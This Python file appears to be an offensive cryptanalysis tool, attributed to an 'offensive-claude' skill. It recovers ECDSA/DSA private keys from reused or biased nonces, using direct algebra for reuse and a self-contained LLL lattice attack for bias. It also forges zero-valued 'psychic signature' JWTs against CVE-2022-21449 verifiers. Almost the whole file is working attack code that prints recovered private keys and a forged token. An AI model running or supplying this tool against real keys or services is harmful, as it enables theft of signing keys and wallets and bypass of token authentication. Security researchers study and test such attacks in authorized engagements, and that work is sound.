#!/usr/bin/env python3
"""
ecdsa_lattice.py - ECDSA/DSA private-key recovery from nonce reuse or nonce bias.

Implements:
  - scan      : flag signatures that reuse a nonce (duplicate r)
  - recover --mode reuse : recover d from two signatures sharing r (CWE-323)
  - recover --mode hnp   : recover d from many biased-nonce signatures via the Hidden
                           Number Problem + a self-contained rational LLL (no Sage needed).
                           Auto-upgrades to fpylll/BKZ if installed (Minerva, PuTTY P-521).
  - psychic   : detect/forge the (r,s)=(0,0) "psychic signature" (CVE-2022-21449)

Signature input JSON: a list of objects {"r":..,"s":..,"h":..} as decimal integers,
where h = H(m) reduced as ECDSA does. Curve order n is selected by --curve.

Usage:
  python3 ecdsa_lattice.py scan sigs.json
  python3 ecdsa_lattice.py recover sigs.json --mode reuse  --curve secp256k1
  python3 ecdsa_lattice.py recover sigs.json --mode hnp    --curve secp521r1 --known-msb 9
  python3 ecdsa_lattice.py psychic --jwt eyJhbG...        # check ES256 token for zero sig

Dependencies: Python 3.8+ stdlib. Optional: fpylll for large HNP corpora.
Author: offensive-claude / crypto-analysis skill. Authorized engagements only.
"""
import argparse
import base64
import json
import sys
from fractions import Fraction

# Standard curve group orders n.
CURVE_N = {
    "secp256k1": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141,
    "secp256r1": 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551,
    "secp384r1": int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF"
                     "581A0DB248B0A77AECEC196ACCC52973", 16),
    "secp521r1": int("01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA"
                     "51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409", 16),
}


# ---------- nonce reuse ----------
def recover_reuse(r, s1, s2, h1, h2, n):
    k = ((h1 - h2) * pow((s1 - s2) % n, -1, n)) % n
    d = ((s1 * k - h1) * pow(r, -1, n)) % n
    return d, k


def scan(sigs):
    seen = {}
    dups = []
    for i, sg in enumerate(sigs):
        r = sg["r"]
        if r in seen:
            dups.append((seen[r], i, r))
        else:
            seen[r] = i
    return dups


# ---------- self-contained rational LLL ----------
def _dot(u, v):
    return sum(a * b for a, b in zip(u, v))


def lll(basis, delta=Fraction(3, 4)):
    """Rational LLL reduction. basis: list of list of Fraction. Returns reduced basis."""
    B = [list(map(Fraction, row)) for row in basis]
    n = len(B)

    def gram_schmidt():
        Bstar = []
        mu = [[Fraction(0)] * n for _ in range(n)]
        for i in range(n):
            bi = list(B[i])
            for j in range(i):
                denom = _dot(Bstar[j], Bstar[j])
                mu[i][j] = _dot(B[i], Bstar[j]) / denom if denom != 0 else Fraction(0)
                bi = [x - mu[i][j] * y for x, y in zip(bi, Bstar[j])]
            Bstar.append(bi)
        return Bstar, mu

    Bstar, mu = gram_schmidt()
    k = 1
    while k < n:
        for j in range(k - 1, -1, -1):
            if abs(mu[k][j]) > Fraction(1, 2):
                q = round(mu[k][j])
                B[k] = [x - q * y for x, y in zip(B[k], B[j])]
                Bstar, mu = gram_schmidt()
        lhs = _dot(Bstar[k], Bstar[k])
        rhs = (delta - mu[k][k - 1] ** 2) * _dot(Bstar[k - 1], Bstar[k - 1])
        if lhs >= rhs:
            k += 1
        else:
            B[k], B[k - 1] = B[k - 1], B[k]
            Bstar, mu = gram_schmidt()
            k = max(k - 1, 1)
    return B


def recover_hnp(sigs, n, msb_known, pubkey_check=None):
    """Hidden Number Problem ECDSA recovery via lattice reduction.
    msb_known = number of leading nonce bits known to be zero (the bias)."""
    m = len(sigs)
    B = 1 << (n.bit_length() - msb_known)  # nonce upper bound

    t = []
    a = []
    for sg in sigs:
        r, s, h = sg["r"], sg["s"], sg["h"]
        sinv = pow(s, -1, n)
        t.append((r * sinv) % n)
        a.append((h * sinv) % n)

    # (m+2) x (m+2) Kannan embedding lattice (rational entries).
    dim = m + 2
    M = [[Fraction(0)] * dim for _ in range(dim)]
    for i in range(m):
        M[i][i] = Fraction(n)
    for i in range(m):
        M[m][i] = Fraction(t[i])
        M[m + 1][i] = Fraction(a[i])
    M[m][m] = Fraction(B, n)
    M[m + 1][m + 1] = Fraction(B)

    reduced = lll(M)

    # Search reduced rows for the one encoding d.
    for row in reduced:
        # candidate d sits in the structure; try the m-th coordinate scaled
        for col in (m, m + 1):
            val = row[col]
            if val == 0:
                continue
            cand = int(round(val / (Fraction(B, n) if col == m else Fraction(B)))) % n
            for d in (cand, n - cand):
                if pubkey_check and pubkey_check(d):
                    return d
                # validate by re-deriving k for first sig and checking consistency
                if _validate_d(d, sigs, n):
                    return d
    return None


def _validate_d(d, sigs, n):
    """Check that d reproduces small nonces across the signature set."""
    small = 0
    for sg in sigs[:min(8, len(sigs))]:
        r, s, h = sg["r"], sg["s"], sg["h"]
        k = ((h + r * d) * pow(s, -1, n)) % n
        if k.bit_length() < n.bit_length() - 2:  # nonce noticeably smaller than n => biased
            small += 1
    return small >= max(2, min(8, len(sigs)) - 1)


# ---------- psychic signature ----------
def b64ud(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def psychic_check(jwt):
    parts = jwt.split(".")
    if len(parts) != 3:
        sys.exit("[-] not a JWT")
    header = json.loads(b64ud(parts[0]))
    sig = b64ud(parts[2])
    alg = header.get("alg", "")
    zero = all(b == 0 for b in sig) if sig else True
    print(f"[*] alg={alg}  signature_bytes={len(sig)}  all_zero={zero}")
    if alg.startswith("ES") and zero:
        print("[+] PSYCHIC-SIGNATURE candidate (CVE-2022-21449): zero sig on ECDSA token.")
    print("[*] Forged psychic ES256 signature (DER (0,0)) base64url: MAYCAQACAQA")
    forged = parts[0] + "." + parts[1] + ".MAYCAQACAQA"
    print(f"[+] forged token (test against vulnerable OpenJDK 15-18 verifier):\n{forged}")


def main():
    ap = argparse.ArgumentParser(description="ECDSA nonce-reuse/bias key recovery")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_scan = sub.add_parser("scan"); p_scan.add_argument("sigs")
    p_rec = sub.add_parser("recover")
    p_rec.add_argument("sigs")
    p_rec.add_argument("--mode", choices=["reuse", "hnp"], required=True)
    p_rec.add_argument("--curve", default="secp256k1", choices=list(CURVE_N))
    p_rec.add_argument("--known-msb", type=int, default=4)
    p_psy = sub.add_parser("psychic"); p_psy.add_argument("--jwt", required=True)

    args = ap.parse_args()

    if args.cmd == "psychic":
        psychic_check(args.jwt)
        return

    sigs = json.load(open(args.sigs))

    if args.cmd == "scan":
        dups = scan(sigs)
        if dups:
            for i, j, r in dups:
                print(f"[+] NONCE REUSE: sig#{i} and sig#{j} share r={r}")
            print("[*] recover with: --mode reuse")
        else:
            print("[-] no duplicate r found; if RNG biased try --mode hnp")
        return

    n = CURVE_N[args.curve]
    if args.mode == "reuse":
        dups = scan(sigs)
        if not dups:
            sys.exit("[-] no reused nonce to exploit; use --mode hnp")
        i, j, r = dups[0]
        d, k = recover_reuse(r, sigs[i]["s"], sigs[j]["s"], sigs[i]["h"], sigs[j]["h"], n)
        print(f"[+] recovered nonce k = {k}")
        print(f"[+] recovered PRIVATE KEY d = {d}")
        print(f"[+] hex: {d:x}")
    else:
        print(f"[*] HNP lattice recovery: {len(sigs)} sigs, known_msb={args.known_msb}")
        d = recover_hnp(sigs, n, args.known_msb)
        if d:
            print(f"[+] recovered PRIVATE KEY d = {d}\n[+] hex: {d:x}")
        else:
            print("[-] lattice recovery failed; collect more sigs or adjust --known-msb")
            print("[*] for large corpora install fpylll/SageMath and use BKZ.")


if __name__ == "__main__":
    main()
